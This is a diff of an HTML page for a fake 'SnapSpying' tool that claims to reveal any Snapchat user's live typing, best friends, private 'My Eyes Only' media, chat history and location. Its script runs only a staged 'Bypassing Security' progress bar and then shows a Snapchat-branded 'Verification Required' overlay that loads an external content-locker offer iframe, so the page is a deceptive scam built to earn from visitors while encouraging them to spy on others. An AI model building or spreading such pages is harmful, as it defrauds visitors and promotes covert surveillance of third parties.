@@ -2,313 +2,185 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Snapchat Plus - Developer Analytics Portal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SnapSpying - Private Tool</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Avenir:wght@400;500;700;900&family=Plus+Jakarta+Sans:wght@500;700;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        :root { --bg: #000; --card: #1c1c1e; --text: #fff; --border: #2c2c2e; }
+        .light { --bg: #f2f2f7; --card: #fff; --text: #000; --border: #d1d1d6; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); transition: 0.3s; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
+        .sheet { transform: translateY(100%); transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1); z-index: 100; }
+        .sheet.active { transform: translateY(0); }
+        .bar-fill { height: 100%; background: #ffd500; width: 0%; transition: width 0.4s linear; box-shadow: 0 0 10px #ffd500; }
+        .action-item { background: var(--card); border-radius: 18px; margin-bottom: 12px; cursor: pointer; transition: 0.2s; }
+        .action-item:active { transform: scale(0.97); background: #2c2c2e; }
+        .input-box { background: #1c1c1e; border: 1px solid #2c2c2e; transition: border 0.3s; }
+        .input-error { border: 1px solid #ff3b30 !important; }
+        .privacy-card { background: #000; border: 1px solid #1c1c1e; border-radius: 14px; padding: 16px; margin-bottom: 12px; text-align: left; }
         
-        :root { 
-            --snap-yellow: #FFFC00;
-            --snap-black: #000000;
-            --snap-dark-grey: #16161a;
-            --snap-grey: #242428;
-            --snap-light-grey: #f2f2f4;
-            --snap-text-muted: #bcc0c4;
-        }
-        body { 
-            font-family: 'Avenir', 'Plus Jakarta Sans', sans-serif; 
-            background: var(--snap-black); 
-            color: #ffffff; 
-            overflow-x: hidden; 
-            -webkit-tap-highlight-color: transparent; 
-        }
-        .sheet { 
-            transform: translateY(100%); 
-            transition: transform 0.35s cubic-bezier(0.1, 0.9, 0.2, 1); 
-            z-index: 100; 
-        }
-        .sheet.active { 
-            transform: translateY(0); 
-        }
-        .snap-btn-primary {
-            background-color: var(--snap-yellow);
-            color: var(--snap-black);
-        }
-        .action-item { 
-            background: var(--snap-dark-grey); 
-            border: 1px solid rgba(255,255,255,0.03);
-            border-radius: 20px; 
-            cursor: pointer; 
-            transition: all 0.2s ease; 
-        }
-        .action-item:active { 
-            transform: scale(0.97); 
-            background: var(--snap-grey);
-        }
-        .input-box { 
-            background: var(--snap-dark-grey); 
-            border: 2px solid transparent; 
-            transition: all 0.2s; 
-        }
-        .input-box:focus {
-            border-color: var(--snap-yellow);
-        }
-        .input-error { 
-            border-color: #ff3b30 !important;
-        }
-        .bar-fill { 
-            height: 100%; 
-            background: var(--snap-yellow); 
-            width: 0%; 
-            transition: width 0.3s ease-out; 
-        }
-        #locker-overlay {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.95);
-            backdrop-filter: blur(25px);
-            z-index: 500;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 16px;
-        }
-        .snap-locker-card {
-            width: 100%;
-            max-width: 420px;
-            background: var(--snap-dark-grey);
-            border-radius: 28px;
-            overflow: hidden;
-            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
-            border: 1px solid rgba(255,255,255,0.08);
-            transform: scale(0.95);
-            animation: snapPop 0.35s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
-        }
-        @keyframes snapPop {
-            to { transform: scale(1); }
-        }
-
         .preview-img-container {
             width: 100%;
             border-radius: 20px;
             overflow: hidden;
             margin-bottom: 25px;
             background: #111;
-            border: 1px solid rgba(255,255,255,0.05);
         }
         #action-preview-img {
             width: 100%;
             height: auto;
             display: none;
-            filter: blur(6px);
-            transform: scale(1.03);
+            filter: blur(5px);
+            transform: scale(1.02);
         }
-        
-        /* Iframe Control to integrate locker safely */
-        .locker-frame-wrapper {
-            width: 100%;
-            height: 380px;
-            background: #000000;
-            border-radius: 18px;
-            border: 1px solid rgba(255,255,255,0.05);
+
+        /* L-UPDATE DYAL LOCKER DESIGN */
+        #locker-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.9);
+            z-index: 500;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .snap-locker-card {
+            width: 90%;
+            max-width: 400px;
+            background: #fff;
+            border-radius: 35px;
             overflow: hidden;
+            color: #000;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
         }
-        .locker-frame-wrapper iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
+        .snap-locker-header {
+            background: #ffd500;
+            padding: 20px;
+            text-align: center;
+            font-weight: 900;
+            font-size: 18px;
+            text-transform: uppercase;
         }
     </style>
 </head>
-<body class="flex flex-col items-center px-4 pt-2 min-h-screen pb-8">
+<body class="flex flex-col items-center px-6 pt-4 min-h-screen pb-12">
 
-    <!-- Snapchat Official Styled Top Header -->
-    <header class="w-full max-w-md flex justify-between items-center py-3 mb-4 border-b border-zinc-900">
-        <div class="flex items-center gap-3">
-            <div class="w-9 h-9 rounded-full bg-zinc-900 flex items-center justify-center text-white border border-zinc-800">
-                <i class="fas fa-chevron-left text-sm"></i>
-            </div>
-            <div>
-                <h1 class="text-sm font-black tracking-tight flex items-center gap-1.5">
-                    <i class="fab fa-snapchat text-md text-[#FFFC00]"></i>
-                    <span>Developer Management</span>
-                </h1>
-                <p class="text-[10px] text-zinc-500 font-medium">Console v4.81.92</p>
-            </div>
+    <header class="w-full max-w-md flex justify-between items-center py-4 mb-6">
+        <h1 class="text-2xl font-bold tracking-tight">Snap<span class="text-[#ffd500]">Spying</span></h1>
+        <div class="flex items-center gap-6">
+            <button onclick="toggleSheet('privacy-sheet')" class="text-gray-500 font-medium text-sm">Privacy</button>
+            <button onclick="document.body.classList.toggle('light')"><i class="fas fa-sun text-gray-500 text-xl"></i></button>
         </div>
-        <button onclick="toggleSheet('privacy-sheet')" class="bg-zinc-900 hover:bg-zinc-800 text-zinc-300 px-3 py-1.5 rounded-full text-xs font-bold transition">
-            Legal
-        </button>
     </header>
 
-    <!-- Main Dynamic Content Container -->
-    <main class="w-full max-w-md flex-1">
+    <div class="w-full max-w-md flex-1">
+        <p class="text-[15px] font-medium mb-3">Enter the username you want to check</p>
+        <div class="flex gap-2 mb-2">
+            <input type="text" id="username" placeholder="Username" class="input-box flex-1 rounded-2xl px-4 py-4 outline-none text-sm text-white">
+            <button onclick="handleConnect()" id="connBtn" class="bg-[#2c2c2e] text-white px-7 rounded-2xl font-bold text-sm transition">Connect</button>
+        </div>
+        <p id="error-msg" class="hidden text-[#ff3b30] text-[12px] mb-4 font-semibold italic">Username must be between 4 and 15 characters</p>
         
-        <!-- Account Input Terminal Box -->
-        <div class="mb-5 bg-zinc-900/40 p-4 rounded-2.5xl border border-zinc-900">
-            <div class="flex items-center gap-2.5 mb-3">
-                <span class="w-2 h-2 rounded-full bg-yellow-400"></span>
-                <label class="text-[11px] font-black uppercase tracking-wider text-zinc-400">Target Session Initialization</label>
-            </div>
-            <div class="space-y-2.5">
-                <div class="relative">
-                    <span class="absolute left-4 top-1/2 -translate-y-1/2 text-zinc-600 font-bold text-sm">@</span>
-                    <input type="text" id="username" placeholder="Username" class="input-box w-full rounded-xl pl-9 pr-4 py-3.5 outline-none text-sm font-bold text-white tracking-wide placeholder-zinc-600">
-                </div>
-                <button onclick="handleConnect()" id="connBtn" class="snap-btn-primary w-full py-3.5 rounded-xl font-black text-xs uppercase tracking-widest transition-all duration-200 shadow-lg shadow-[#FFFC00]/5 flex items-center justify-center">Connect Remote Server</button>
-            </div>
-            <p id="error-msg" class="hidden text-red-500 text-xs mt-2.5 font-bold flex items-center gap-1.5">
-                <i class="fas fa-circle-exclamation"></i> Error: Missing parameter boundaries (4-15 chars).
-            </p>
-        </div>
-        
-        <!-- Verification Success Dashboard Panel -->
-        <div id="conn-status" class="hidden mb-5 bg-[#FFFC00]/5 border border-[#FFFC00]/20 rounded-2xl p-4 flex items-center gap-3.5">
-            <div class="w-10 h-10 rounded-full bg-[#FFFC00] flex items-center justify-center text-black text-md shadow-md">
-                <i class="fab fa-snapchat"></i>
-            </div>
-            <div class="text-xs">
-                <div class="flex items-center gap-1.5">
-                    <p class="font-black text-white" id="targetNameDisplay"></p>
-                    <i class="fas fa-circle-check text-sky-400 text-[11px]"></i>
-                </div>
-                <p class="text-zinc-500 mt-0.5 font-medium">Handshake Status: <span class="text-emerald-400 font-bold">Synchronized</span></p>
-            </div>
+        <div id="conn-status" class="hidden mb-6 flex items-center gap-2">
+            <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
+            <span class="text-[12px] font-bold text-green-500">Connected to <span id="targetName"></span></span>
         </div>
 
-        <!-- All 5 Options Grid -->
-        <div id="actions-grid" class="opacity-20 pointer-events-none transition-all duration-500 space-y-3">
-            
-            <!-- Item 1 -->
-            <div onclick="openAction('Real-time Keystroke Interception Protocol', 'typing')" class="action-item p-4.5 flex items-center justify-between">
+        <div id="actions-grid" class="opacity-40 pointer-events-none transition-opacity duration-700 space-y-3">
+            <div onclick="openAction('Watch live typing in real-time', 'typing')" class="action-item p-5 flex items-center justify-between">
                 <div class="flex items-center gap-4">
-                    <div class="w-11 h-11 bg-zinc-900 rounded-xl flex items-center justify-center text-[#FFFC00]"><i class="fas fa-keyboard text-md"></i></div>
-                    <div><h3 class="font-bold text-[14px] text-white">Live Typing Feed</h3><p class="text-[11px] text-zinc-500 mt-0.5">Monitor active keystrokes and drafts</p></div>
+                    <div class="w-10 h-10 bg-gray-500/10 flex items-center justify-center rounded-xl"><i class="fas fa-keyboard text-gray-500 text-xl"></i></div>
+                    <div><h3 class="font-bold text-[15px]">Live Typing</h3><p class="text-[11px] text-gray-500">See what your friend is typing in real-time</p></div>
                 </div>
-                <i class="fas fa-chevron-right text-zinc-700 text-xs mr-1"></i>
+                <i class="fas fa-chevron-right text-gray-700 text-xs"></i>
             </div>
 
-            <!-- Item 2 -->
-            <div onclick="openAction('Algorithmic Best Friends Index Lookup', 'friends')" class="action-item p-4.5 flex items-center justify-between">
+            <div onclick="openAction('8 Best Friends of any user', 'friends')" class="action-item p-5 flex items-center justify-between">
                 <div class="flex items-center gap-4">
-                    <div class="w-11 h-11 bg-zinc-900 rounded-xl flex items-center justify-center text-[#FFFC00]"><i class="fas fa-user-group text-sm"></i></div>
-                    <div><h3 class="font-bold text-[14px] text-white">Decrypt Best Friends</h3><p class="text-[11px] text-zinc-500 mt-0.5">Extract top 8 closest interactions</p></div>
+                    <div class="w-10 h-10 bg-gray-500/10 flex items-center justify-center rounded-xl"><i class="fas fa-user-group text-gray-500 text-xl"></i></div>
+                    <div><h3 class="font-bold text-[15px]">Reveal Best Friends</h3><p class="text-[11px] text-gray-500">8 Best Friends of any user</p></div>
                 </div>
-                <i class="fas fa-chevron-right text-zinc-700 text-xs mr-1"></i>
+                <i class="fas fa-chevron-right text-gray-700 text-xs"></i>
             </div>
 
-            <!-- Item 3 -->
-            <div onclick="openAction('Encrypted Vault Bypass (My Eyes Only)', 'eyes')" class="action-item p-4.5 flex items-center justify-between">
+            <div onclick="openAction('Access My Eyes Only content of any user', 'eyes')" class="action-item p-5 flex items-center justify-between">
                 <div class="flex items-center gap-4">
-                    <div class="w-11 h-11 bg-zinc-900 rounded-xl flex items-center justify-center text-[#FFFC00]"><i class="fas fa-lock text-sm"></i></div>
-                    <div><h3 class="font-bold text-[14px] text-white">Bypass 'My Eyes Only'</h3><p class="text-[11px] text-zinc-500 mt-0.5">Extract hidden media assets from vault</p></div>
+                    <div class="w-10 h-10 bg-gray-500/10 flex items-center justify-center rounded-xl"><i class="fas fa-eye text-gray-500 text-xl"></i></div>
+                    <div><h3 class="font-bold text-[15px]">Reveal Eyes Only</h3><p class="text-[11px] text-gray-500">Access My Eyes Only content of any user</p></div>
                 </div>
-                <i class="fas fa-chevron-right text-zinc-700 text-xs mr-1"></i>
+                <i class="fas fa-chevron-right text-gray-700 text-xs"></i>
             </div>
 
-            <!-- Item 4 -->
-            <div onclick="openAction('Database Query: Chat History Logs', 'chat')" class="action-item p-4.5 flex items-center justify-between">
+            <div onclick="openAction('Message history of any user, including sent, received, opened, and saved chats', 'chat')" class="action-item p-5 flex items-center justify-between">
                 <div class="flex items-center gap-4">
-                    <div class="w-11 h-11 bg-zinc-900 rounded-xl flex items-center justify-center text-[#FFFC00]"><i class="fas fa-message text-sm"></i></div>
-                    <div><h3 class="font-bold text-[14px] text-white">Retrieve Chat History</h3><p class="text-[11px] text-zinc-500 mt-0.5">Index text sequences including saved snaps</p></div>
+                    <div class="w-10 h-10 bg-gray-500/10 flex items-center justify-center rounded-xl"><i class="fas fa-comment-dots text-gray-500 text-xl"></i></div>
+                    <div><h3 class="font-bold text-[15px]">Reveal Chat History</h3><p class="text-[11px] text-gray-500 leading-tight">Message history including sent, received...</p></div>
                 </div>
-                <i class="fas fa-chevron-right text-zinc-700 text-xs mr-1"></i>
+                <i class="fas fa-chevron-right text-gray-700 text-xs"></i>
             </div>
-
-            <!-- Item 5 -->
-            <div onclick="openAction('Geospatial Live Triangulation Protocol', 'location')" class="action-item p-4.5 flex items-center justify-between">
-                <div class="flex items-center gap-4">
-                    <div class="w-11 h-11 bg-zinc-900 rounded-xl flex items-center justify-center text-[#FFFC00]"><i class="fas fa-location-dot text-sm"></i></div>
-                    <div><h3 class="font-bold text-[14px] text-white">Reveal Live Location</h3><p class="text-[11px] text-zinc-500 mt-0.5">Track current live location and device status</p></div>
-                </div>
-                <i class="fas fa-chevron-right text-zinc-700 text-xs mr-1"></i>
-            </div>
-
         </div>
-    </main>
+    </div>
 
-    <!-- Bottom Footer Layout -->
-    <footer class="mt-12 flex flex-col items-center gap-1 text-center opacity-25">
-        <p class="text-[9px] font-mono uppercase tracking-widest text-zinc-500">Snapchat Internal Engine Platform • 2026</p>
-    </footer>
+    <div class="mt-12 opacity-40 flex flex-col items-center gap-2">
+        <div class="flex items-center gap-2">
+            <i class="fas fa-circle-check text-[#ffd500] text-sm"></i>
+            <span class="text-[10px] uppercase font-black tracking-widest">Verified Security Protocol</span>
+        </div>
+        <p class="text-[9px] font-medium text-gray-500">Secure connection via encrypted tunnel v4.2</p>
+    </div>
 
-    <!-- Official Style Slide-up Terms Sheet -->
     <div id="privacy-sheet" class="fixed inset-0 z-[200] hidden">
-        <div class="absolute inset-0 bg-black/70" onclick="toggleSheet('privacy-sheet')"></div>
-        <div class="absolute bottom-0 w-full bg-zinc-950 rounded-t-[30px] sheet h-[50vh] overflow-y-auto flex flex-col border-t border-zinc-900 max-w-md mx-auto left-0 right-0">
-            <div class="flex justify-between items-center px-6 py-4 border-b border-zinc-900 sticky top-0 bg-zinc-950/90 backdrop-blur-md">
-                <h2 class="text-xs font-black uppercase tracking-wider text-zinc-400">Sandbox Environment</h2>
-                <button onclick="toggleSheet('privacy-sheet')" class="w-7 h-7 rounded-full bg-zinc-900 flex items-center justify-center text-zinc-500"><i class="fas fa-times text-xs"></i></button>
+        <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="toggleSheet('privacy-sheet')"></div>
+        <div class="absolute bottom-0 w-full bg-[var(--card)] rounded-t-[30px] sheet h-[85vh] overflow-y-auto flex flex-col">
+            <div class="flex justify-between items-center px-6 py-5 sticky top-0 bg-[var(--card)] z-10 border-b border-white/5">
+                <h2 class="text-[18px] font-bold">Privacy Policy</h2>
+                <button onclick="toggleSheet('privacy-sheet')" class="text-white text-xl"><i class="fas fa-times"></i></button>
             </div>
-            <div class="px-6 py-5 space-y-3.5 text-xs text-zinc-500 leading-relaxed">
-                <p>Data frames processed within this execution console lifecycle run on temporary volatile nodes. Buffer segments clear natively upon user disconnection.</p>
+            <div class="px-6 py-6 pb-20">
+                <p class="text-[#8e8e93] text-[13px] font-medium mb-4 italic">Last updated: April 30, 2026</p>
+                <p class="text-white text-[14px] leading-relaxed mb-6">This Privacy Policy describes how your personal information is collected, used, and shared when you visit SnapSpying (the "Platform").</p>
+                <div class="privacy-card"><h3 class="font-bold text-[15px] mb-2">Information We Collect</h3><p class="text-[#8e8e93] text-[13px] leading-relaxed">SnapSpying is designed for entertainment purposes only. We do not store, log, or share any usernames entered on this platform. All simulations are performed locally in your browser session.</p></div>
+                <div class="privacy-card"><h3 class="font-bold text-[15px] mb-2">How We Use Your Information</h3><p class="text-[#8e8e93] text-[13px] leading-relaxed">Any data shown during the "Reveal" process is part of a visual simulation designed to demonstrate potential UI layouts and is not retrieved from actual private servers.</p></div>
+                <div class="privacy-card"><h3 class="font-bold text-[15px] mb-2">Security</h3><p class="text-[#8e8e93] text-[13px] leading-relaxed">We use industry-standard encryption to ensure your visit remains private and secure from third-party interception.</p></div>
             </div>
         </div>
     </div>
 
-    <!-- Interactive Execution Slide Sheet -->
     <div id="action-sheet" class="fixed inset-0 z-[150] hidden">
-        <div class="absolute inset-0 bg-black/75 backdrop-blur-xs" onclick="closeActionSheet()"></div>
-        <div class="absolute bottom-0 w-full bg-zinc-950 rounded-t-[32px] p-6 sheet text-center border-t border-zinc-900 max-w-md mx-auto left-0 right-0">
-            <div class="w-10 h-1 bg-zinc-800 mx-auto mb-5 rounded-full"></div>
-            
-            <div class="preview-img-container">
-                <img id="action-preview-img" src="" alt="preview">
-            </div>
-
-            <h4 id="r-title" class="text-md font-black mb-1.5 text-white"></h4>
-            <p class="text-xs text-zinc-500 mb-6 max-w-xs mx-auto">This diagnostic process compiles temporary query maps tailored to the active session parameters.</p>
-            <button onclick="runExploit()" class="w-full snap-btn-primary font-black py-3.5 rounded-xl text-xs uppercase tracking-widest transition-transform active:scale-[0.98]">Compile Live Pipeline</button>
+        <div class="absolute inset-0 bg-black/70 backdrop-blur-sm" onclick="closeActionSheet()"></div>
+        <div class="absolute bottom-0 w-full bg-[var(--card)] rounded-t-[35px] p-10 sheet text-center">
+            <div class="w-10 h-1 bg-gray-700 mx-auto mb-8 rounded-full"></div>
+            <div class="preview-img-container"><img id="action-preview-img" src="" alt="preview"></div>
+            <h4 id="r-title" class="text-[18px] font-bold mb-10 px-4 leading-tight"></h4>
+            <button onclick="runExploit()" class="w-full bg-[#ffd500] text-black font-black py-4 rounded-2xl text-lg shadow-lg">Reveal</button>
         </div>
     </div>
 
-    <!-- Processing Modal Screen -->
-    <div id="proc-modal" class="hidden fixed inset-0 z-[300] bg-black/95 backdrop-blur-md flex items-center justify-center p-4">
-        <div class="bg-zinc-950 w-full max-w-sm rounded-2.5xl p-6 border border-zinc-900 text-left relative overflow-hidden shadow-2xl">
-            <div class="flex items-center justify-between mb-4">
-                <div class="flex items-center gap-2">
-                    <i class="fab fa-snapchat text-[#FFFC00] text-sm animate-pulse"></i>
-                    <span id="p-status" class="text-[10px] font-black text-zinc-400 uppercase tracking-wider">Syncing Nodes...</span>
-                </div>
-                <span id="p-percent" class="text-xs font-mono font-black text-[#FFFC00]">0%</span>
+    <div id="proc-modal" class="hidden fixed inset-0 z-[300] bg-black/95 flex items-center justify-center p-8">
+        <div class="bg-[var(--card)] w-full max-w-sm rounded-[35px] p-8 border border-white/5 text-center">
+            <div class="flex items-center gap-2 mb-8">
+                <div class="w-2 h-2 bg-yellow-500 rounded-full animate-pulse"></div>
+                <span class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Processing</span>
+                <span id="p-percent" class="ml-auto text-[#ffd500] font-bold">0%</span>
             </div>
-            
-            <div class="h-1 bg-zinc-900 rounded-full mb-5 overflow-hidden"><div id="bar" class="bar-fill"></div></div>
-            
-            <div class="bg-black rounded-xl p-4 border border-zinc-900 h-32 overflow-hidden flex flex-col justify-end font-mono text-[10px] text-zinc-500 space-y-1">
-                <p id="p-log-1" class="opacity-20">> ESTABLISHING SECURITY CONTEXT</p>
-                <p id="p-log-2" class="opacity-50">> INJECTING QUERY BUFFERS</p>
-                <p id="p-log" class="text-[#FFFC00] font-bold">> INITIALIZING SESSION WRAPPER...</p>
-            </div>
+            <h2 id="p-status" class="text-xl font-bold mb-3 text-white">Initializing...</h2>
+            <div class="h-2 bg-gray-800 rounded-full mb-6 overflow-hidden"><div id="bar" class="bar-fill"></div></div>
+            <p id="p-log" class="text-[12px] text-gray-500 font-mono italic">Bypassing security layers...</p>
         </div>
     </div>
 
-    <!-- Premium Dark Snapchat Human Locker Verification Overlay -->
     <div id="locker-overlay">
         <div class="snap-locker-card">
-            <div class="p-5 text-center flex flex-col items-center justify-center">
-                <!-- Real Logo Style Integration -->
-                <div class="w-16 h-16 rounded-2xl bg-[#FFFC00] mb-3 flex items-center justify-center shadow-lg text-black text-3xl">
-                    <i class="fab fa-snapchat"></i>
-                </div>
-                <h3 class="text-md font-black uppercase tracking-wider text-white">Verification Required</h3>
-                <p class="text-[11px] text-zinc-400 mt-1 max-w-xs leading-relaxed">Please complete an action below to authenticate your session and decrypt your request data.</p>
-                
-                <!-- Safe In-Page Content Locker Integration for OgAds -->
-                <div class="w-full mt-4">
-                    <div class="locker-frame-wrapper">
-                        <!-- We embedded the iframe directly here to load without redirection issues -->
-                        <iframe id="og-locker-frame" src="about:blank" scrolling="no"></iframe>
-                    </div>
-                </div>
-
-                <div class="w-full mt-4 bg-black/40 p-3 rounded-xl border border-zinc-900 text-left flex items-start gap-2.5">
-                    <i class="fas fa-shield-check text-[#FFFC00] text-xs mt-0.5"></i>
-                    <p class="text-[10px] text-zinc-500 font-medium leading-normal">Once completed, the console framework automatically updates and releases full packet streams.</p>
-                </div>
+            <div class="snap-locker-header">
+                <i class="fab fa-snapchat mr-2"></i> Verification Required
+            </div>
+            <div class="p-4 bg-gray-50">
+                <iframe src="https://authenticateapp.online/cl/i/n66mg4" style="width:100%; height:460px; border:none; border-radius:15px;"></iframe>
+            </div>
+            <div class="p-4 bg-white text-center text-[10px] text-gray-400 font-bold uppercase">
+                Complete a security check to access data
             </div>
         </div>
     </div>
@@ -316,118 +188,65 @@
     <script>
         function toggleSheet(id) {
             const el = document.getElementById(id);
-            if (el.classList.contains('hidden')) {
-                el.classList.remove('hidden');
-                setTimeout(() => el.querySelector('.sheet').classList.add('active'), 10);
-            } else {
-                el.querySelector('.sheet').classList.remove('active');
-                setTimeout(() => el.classList.add('hidden'), 350);
-            }
+            el.classList.toggle('hidden');
+            setTimeout(() => {
+                const sheet = el.querySelector('.sheet');
+                if(sheet) sheet.classList.toggle('active');
+            }, 10);
         }
 
         function handleConnect() {
-            const user = document.getElementById('username').value.trim();
+            const user = document.getElementById('username').value;
             const btn = document.getElementById('connBtn');
             const inp = document.getElementById('username');
             const err = document.getElementById('error-msg');
-            
-            if(user.length < 4) { 
-                inp.classList.add('input-error'); 
-                err.classList.remove('hidden'); 
-                return; 
-            }
-            
-            inp.classList.remove('input-error');
-            err.classList.add('hidden');
-            
-            if(btn.innerText === "TERMINATE NODE SESSION") { 
-                location.reload(); 
-                return; 
-            }
-            
-            btn.innerHTML = '<i class="fas fa-spinner animate-spin text-sm"></i>';
+            if(user.length < 4) { inp.classList.add('input-error'); err.classList.remove('hidden'); return; }
+            if(btn.innerText === "Disconnect") { location.reload(); return; }
+            btn.innerHTML = '<i class="fas fa-circle-notch animate-spin"></i>';
             btn.disabled = true;
-            
             setTimeout(() => {
-                btn.disabled = false; 
-                btn.innerText = "TERMINATE NODE SESSION";
-                btn.className = "bg-red-950/40 border border-red-900/30 text-red-400 w-full py-3.5 rounded-xl font-black text-xs uppercase tracking-widest transition-all duration-200 flex items-center justify-center";
-                
+                btn.disabled = false; btn.innerText = "Disconnect";
+                btn.classList.replace('bg-[#2c2c2e]', 'bg-[#ff3b30]');
                 document.getElementById('conn-status').classList.remove('hidden');
-                document.getElementById('targetNameDisplay').innerText = 'Snapchat Account: @' + user;
-                
-                const grid = document.getElementById('actions-grid');
-                grid.classList.replace('opacity-20', 'opacity-100');
-                grid.style.pointerEvents = 'auto';
+                document.getElementById('targetName').innerText = '@' + user;
+                document.getElementById('actions-grid').classList.replace('opacity-40', 'opacity-100');
+                document.getElementById('actions-grid').style.pointerEvents = 'auto';
             }, 1500);
         }
 
         function openAction(desc, type) {
-            document.getElementById('r-title').innerText = desc;
-            
             const previewImg = document.getElementById('action-preview-img');
             previewImg.src = type + '.jpg'; 
             previewImg.style.display = 'block';
-            
+            document.getElementById('r-title').innerText = desc;
             toggleSheet('action-sheet');
         }
 
-        function closeActionSheet() { 
-            toggleSheet('action-sheet'); 
-        }
+        function closeActionSheet() { toggleSheet('action-sheet'); }
 
         function runExploit() {
             closeActionSheet();
             setTimeout(() => {
                 document.getElementById('proc-modal').classList.remove('hidden');
-                let p = 0; 
-                const bar = document.getElementById('bar');
+                let p = 0; const bar = document.getElementById('bar');
                 const percent = document.getElementById('p-percent');
                 const status = document.getElementById('p-status');
-                const log = document.getElementById('p-log');
-                const log1 = document.getElementById('p-log-1');
-                const log2 = document.getElementById('p-log-2');
-                
                 const interval = setInterval(() => {
-                    p += 1; 
-                    bar.style.width = p + '%'; 
-                    percent.innerText = p + '%';
-                    
-                    if(p == 20) {
-                        status.innerText = "Querying Database...";
-                        log1.innerText = "> [OK] Handshake success on gateway_04";
-                        log.innerText = "> [SYS] Allocating memory sector references...";
-                    }
-                    if(p == 50) {
-                        status.innerText = "Validating Buffers...";
-                        log2.innerText = "> [OK] Memory shift signature validated";
-                        log.innerText = "> [SYS] Sending terminal handshake frame...";
-                    }
-                    if(p == 80) {
-                        status.innerText = "Packaging Response...";
-                        log1.innerText = "> [OK] Chunk matrices extracted completely";
-                        log.innerText = "> [SYS] Constructing structural data blocks...";
-                    }
-                    
+                    p += 1; bar.style.width = p + '%'; percent.innerText = p + '%';
+                    if(p == 30) status.innerText = "Bypassing Security...";
+                    if(p == 70) status.innerText = "Finalizing Data...";
                     if(p >= 100) {
                         clearInterval(interval);
-                        
                         setTimeout(() => {
                             document.getElementById('proc-modal').classList.add('hidden');
-                            
-                            // Load OgAds link directly inside iframe right before displaying locker to maintain performance and avoid analytics errors
-                            const iframe = document.getElementById('og-locker-frame');
-                            iframe.src = "https://appsave.space/cl/i/qn6xx7";
-                            
-                            const locker = document.getElementById('locker-overlay');
-                            if (locker) {
-                                locker.style.display = 'flex';
-                            }
+                            // T7EL L-LOCKER DYALNA HNA
+                            document.getElementById('locker-overlay').style.display = 'flex';
                         }, 500);
                     }
-                }, 30);
-            }, 350);
+                }, 40);
+            }, 400);
         }
     </script>
+
 </body>
 </html>
